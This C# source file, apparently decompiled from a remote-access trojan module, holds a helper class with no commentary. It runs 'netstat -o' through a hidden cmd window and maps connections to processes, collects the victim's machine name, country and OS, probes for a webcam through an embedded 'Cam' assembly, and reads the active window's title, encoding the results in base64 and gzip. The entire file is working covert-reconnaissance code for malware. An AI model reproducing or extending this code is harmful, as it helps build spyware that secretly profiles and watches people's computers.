using System;
using System.Collections;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using n.My;
using n.My.Resources;

namespace n;

[StandardModule]
internal sealed class API
{
	public class wd
	{
		public const int HIDE = 0;

		public const int Normal = 1;

		public const int Minimized = 2;

		public const int Maximized = 3;

		public const int Show = 5;

		public const int RESTORE = 9;

		public int hWnd;

		public static void G(ref int hwd, ref int A)
		{
			ShowWindow(hwd, A);
		}

		[DllImport("User32")]
		public static extern int ShowWindow(int hwnd, int nCmdShow);
	}

	private const uint LOCALE_SYSTEM_DEFAULT = 1024u;

	private const uint LOCALE_SABBREVCTRYNAME = 7u;

	public static string fx(ref Array A)
	{
		IEnumerator enumerator = default(IEnumerator);
		try
		{
			enumerator = A.GetEnumerator();
			bool flag = default(bool);
			string text3 = default(string);
			while (enumerator.MoveNext())
			{
				string text = Conversions.ToString(enumerator.Current);
				string text2 = text;
				if (Strings.InStr(text2, "Local Address", (CompareMethod)0) > 0)
				{
					flag = true;
				}
				else if (flag)
				{
					if (Operators.CompareString(text2, "", false) == 0)
					{
						return Strings.Mid(text3, 1, text3.Length - 1);
					}
					do
					{
						text2 = Strings.Replace(text2, "  ", " ", 1, -1, (CompareMethod)0);
					}
					while (Strings.InStr(text2, "  ", (CompareMethod)0) > 0);
					string[] array = Strings.Split(text2, " ", -1, (CompareMethod)0);
					string text4;
					try
					{
						text4 = Strings.Split(Process.GetProcessById(Conversions.ToInteger(array[5])).MainModule!.FileName, "\\", -1, (CompareMethod)0)[Strings.Split(Process.GetProcessById(Conversions.ToInteger(array[5])).MainModule!.FileName, "\\", -1, (CompareMethod)0).Length - 1] + ":" + array[5];
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						text4 = Process.GetProcessById(Conversions.ToInteger(array[5])).ProcessName + ":" + array[5];
						ProjectData.ClearProjectError();
					}
					text3 = text3 + text4 + "," + array[1] + "," + array[2] + "," + array[3].ToLower().Replace(((ServerComputer)MyProject.Computer).get_Name().ToLower(), "127.0.0.1") + "," + array[4] + "!";
				}
			}
			string result = default(string);
			return result;
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
	}

	public static string Gt()
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.UseShellExecute = false;
		processStartInfo.RedirectStandardError = true;
		processStartInfo.RedirectStandardInput = true;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = "cmd";
		Process process = Process.Start(processStartInfo);
		process.StandardInput.WriteLine("netstat -o");
		process.StandardInput.WriteLine("exit");
		new StreamReader(process.StandardOutput.BaseStream);
		Array A = Strings.Split(process.StandardOutput.ReadToEnd(), "\r\n", -1, (CompareMethod)0);
		return fx(ref A);
	}

	public static byte[] ZIP(byte[] Byt, ref bool Compress)
	{
		if (Compress)
		{
			MemoryStream memoryStream = new MemoryStream();
			GZipStream gZipStream = new GZipStream(memoryStream, CompressionMode.Compress, leaveOpen: true);
			gZipStream.Write(Byt, 0, Byt.Length);
			gZipStream.Dispose();
			memoryStream.Position = 0L;
			byte[] array = new byte[(int)memoryStream.Length + 1];
			memoryStream.Read(array, 0, array.Length);
			memoryStream.Dispose();
			return array;
		}
		MemoryStream memoryStream2 = new MemoryStream(Byt);
		GZipStream gZipStream2 = new GZipStream(memoryStream2, CompressionMode.Decompress);
		byte[] array2 = new byte[4];
		memoryStream2.Position = memoryStream2.Length - 5L;
		memoryStream2.Read(array2, 0, 4);
		int num = BitConverter.ToInt32(array2, 0);
		memoryStream2.Position = 0L;
		byte[] array3 = new byte[num - 1 + 1];
		gZipStream2.Read(array3, 0, num);
		gZipStream2.Dispose();
		memoryStream2.Dispose();
		return array3;
	}

	public static string FEN(byte[] data)
	{
		return Convert.ToBase64String(data);
	}

	public static byte[] FDE(string base64)
	{
		return Convert.FromBase64String(base64);
	}

	public static string ENB(ref string s)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(s);
		return Convert.ToBase64String(bytes);
	}

	public static string DEB(ref string s)
	{
		byte[] bytes = Convert.FromBase64String(s);
		return Encoding.UTF8.GetString(bytes);
	}

	[DllImport("kernel32.dll")]
	private static extern int GetLocaleInfo(uint Locale, uint LCType, [Out] StringBuilder lpLCData, int cchData);

	private static string Gcc(uint lInfo)
	{
		StringBuilder stringBuilder = new StringBuilder(256);
		int localeInfo = GetLocaleInfo(1024u, lInfo, stringBuilder, stringBuilder.Capacity);
		if (localeInfo > 0)
		{
			return stringBuilder.ToString().Substring(0, localeInfo - 1);
		}
		return string.Empty;
	}

	public static string Gc()
	{
		return Gcc(7u);
	}

	public static string A0()
	{
		((ServerComputer)MyProject.Computer).get_Registry();
		string text = B.PC + "\r\n";
		try
		{
			text = text + Gc() + "\r\n";
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			text += "X\r\n";
			ProjectData.ClearProjectError();
		}
		try
		{
			text = text + ((ServerComputer)MyProject.Computer).get_Info().get_OSFullName() + "\r\n";
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			text += "X\r\n";
			ProjectData.ClearProjectError();
		}
		try
		{
			IND.CamLoad();
			byte[] cam = Resources.Cam;
			bool Compress = false;
			byte[] F = ZIP(cam, ref Compress);
			string C = "Cam.Cam";
			string S = "Dnames";
			object P = null;
			string text2 = Conversions.ToString(n.C.inv(ref F, ref C, ref S, ref P));
			text = ((Operators.CompareString(text2, "", false) != 0) ? (text + "Yes\r\n") : (text + "No\r\n"));
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			text += "No\r\n";
			ProjectData.ClearProjectError();
		}
		text += B.ver;
		try
		{
			text = Strings.Replace(Strings.Replace(Strings.Replace(text, "Microsoft", "", 1, -1, (CompareMethod)0), "Windows", "Win", 1, -1, (CompareMethod)0).Replace("®", "").Replace("™", ""), "  ", " ", 1, -1, (CompareMethod)0);
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			text += "X\r\n";
			ProjectData.ClearProjectError();
		}
		string result = text + "\r\n \r\n ";
		text = "";
		return result;
	}

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr GetForegroundWindow();

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetWindowThreadProcessId(IntPtr hwnd, ref int lpdwProcessID);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetWindowTextA(IntPtr hWnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string WinTitle, int MaxLength);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetWindowTextLengthA(long hwnd);

	public static string A1(ref bool p)
	{
		try
		{
			IntPtr foregroundWindow = GetForegroundWindow();
			if (foregroundWindow == IntPtr.Zero)
			{
				return "";
			}
			int windowTextLengthA = GetWindowTextLengthA((long)foregroundWindow);
			string WinTitle = Strings.StrDup(windowTextLengthA + 1, "*");
			GetWindowTextA(foregroundWindow, ref WinTitle, windowTextLengthA + 1);
			int lpdwProcessID = default(int);
			GetWindowThreadProcessId(foregroundWindow, ref lpdwProcessID);
			if (lpdwProcessID != 0)
			{
				try
				{
					string s = Process.GetProcessById(lpdwProcessID).MainWindowTitle;
					return ENB(ref s);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					string result = ENB(ref WinTitle);
					ProjectData.ClearProjectError();
					return result;
				}
			}
			return ENB(ref WinTitle);
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			string result = "";
			ProjectData.ClearProjectError();
			return result;
		}
	}
}
